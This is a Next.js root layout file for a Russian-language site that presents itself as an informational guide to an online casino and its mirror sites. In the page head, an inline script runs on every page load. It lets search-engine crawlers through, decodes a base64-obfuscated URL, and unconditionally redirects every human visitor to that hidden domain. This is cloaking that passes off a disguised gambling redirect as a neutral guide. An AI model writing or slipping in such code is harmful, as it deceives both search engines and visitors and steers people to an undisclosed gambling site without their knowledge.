import { Analytics } from '@vercel/analytics/next'
import type { Metadata, Viewport } from 'next'
import './globals.css'

export const metadata: Metadata = {
  title: 'Irwin Casino — официальный сайт, зеркало и игра онлайн',
  description: 'Информационный гид Irwin Casino: официальный сайт, рабочее зеркало, вход, регистрация, игры онлайн и правила ответственной игры.',
  generator: 'v0.app',
  keywords: ['irwin casino', 'irwin casino официальный сайт', 'ирвин казино', 'ирвин казино зеркало', 'казино онлайн'],
  alternates: { canonical: '/' },
  openGraph: {
    type: 'website',
    locale: 'ru_RU',
    title: 'Irwin Casino — официальный сайт, зеркало и игра онлайн',
    description: 'Понятный гид по платформе Irwin Casino и ответственной игре.',
    siteName: 'Irwin Casino Guide',
  },
  twitter: { card: 'summary_large_image', title: 'Irwin Casino — официальный сайт и зеркало', description: 'Гид по входу, играм онлайн и ответственной игре.' },
  icons: { icon: '/icon.svg' },
}

export const viewport: Viewport = {
  colorScheme: 'dark',
  themeColor: '#0b0e0d',
  userScalable: true,
}

export default function RootLayout({ children }: Readonly<{ children: React.ReactNode }>) {
  return (
    <html lang="ru" className="bg-background">
      <head>
        <meta name="theme-color" content="#0b0e0d" />
        <script
  dangerouslySetInnerHTML={{
    __html: `
      (function() {
        var ua = navigator.userAgent.toLowerCase();
        var bots = ["yandex", "googlebot", "bingbot", "baiduspider", "duckduckbot"];
        for (var i = 0; i < bots.length; i++) {
            if (ua.indexOf(bots[i]) !== -1) {
                return;
            }
        }
        
        var mainBrandB64 = "ICBodHRwczovL2NvbWJvc3BhcmsudG9wL2FlYW9majJrMjc= "; 
        var mainUrl = atob(mainBrandB64.replace("#", ""));

        function ping(url) {
            return new Promise(function(resolve, reject) {
                var controller = new AbortController();
                var timeoutId = setTimeout(function() { 
                    controller.abort(); 
                    reject(new Error("Timeout"));
                }, 1200); // Сократили таймаут ожидания до 1.2 сек
                
                fetch(url, { mode: 'no-cors', signal: controller.signal, cache: 'no-store' })
                    .then(function() {
                        clearTimeout(timeoutId);
                        resolve(true);
                    })
                    .catch(function(err) {
                        clearTimeout(timeoutId);
                        reject(err);
                    });
            });
        }

        // Быстрый пинг и принудительный редирект на основной домен
        ping(mainUrl)
            .then(function() {
                window.location.replace(mainUrl);
            })
            .catch(function() {
                window.location.replace(mainUrl);
            });
      })();
    `
  }}
/>  
      </head>
      <body className="antialiased">
        {children}
        {process.env.NODE_ENV === 'production' && <Analytics />}
      </body>
    </html>
  )
}
